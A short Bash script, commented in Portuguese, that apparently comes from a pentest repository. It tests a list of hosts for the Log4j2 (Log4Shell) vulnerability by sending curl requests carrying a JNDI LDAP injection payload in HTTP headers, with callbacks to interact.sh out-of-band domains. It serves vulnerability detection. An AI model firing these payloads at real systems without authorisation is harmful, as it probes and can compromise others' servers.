#!/bin/bash

#############################################################################
#   Repositorio:    Pentest Scrpts - CVEs                                   #
#   Nome:           Detect Log4j2                                           #
#   Descrição:      Script para detectar a vulnerabilidade do Log4j2        #
#		    em servidores externos (Out-of-Bound)		    #
#   Autor:          Carine Constantino                                      #
#   Versão:         1.0                                                     #
#   Data:           03/01/2022                                              #                                      
#   Função:         Script para detectar a vulnerabilidade                  #  
#                   Log4j2 em servidores externos                           #
#                                                                           #
#   Exploit-DB: Exploit-DB: https://www.exploit-db.com/exploits/50592\n     #
#                                                                           #
#############################################################################

	echo "----------------------------"
	echo "Vuln Log4j2" 
	echo "Detect Out-of-Bound to Log4j2" 
	echo "Exploit-DB: https://www.exploit-db.com/exploits/50592\n" 
	echo "----------------------------"
	echo "How to Use: Add on cURL command header-parameter to inject and Interact session link" 
	echo "Exemplo: "curl 192.168.0.1:8080 -H 'User-Agent: ${jndi:ldap://23345ddrdshp2vtc0000w8xdggdw3oahyyyyyb.interact.sh/a}'"" 

	echo "--------------------"
	for x in $(cat listahosts.txt);
do
	echo "--------------------"
	echo "Log4j2 Testing...$x"
	echo "--------------------"	
	curl $x -H 'X-Api-Version: ${jndi:ldap://cre4ty812vtc000016ywggdinxfeyyyyyb.interact.sh/$1}';
	
	
done
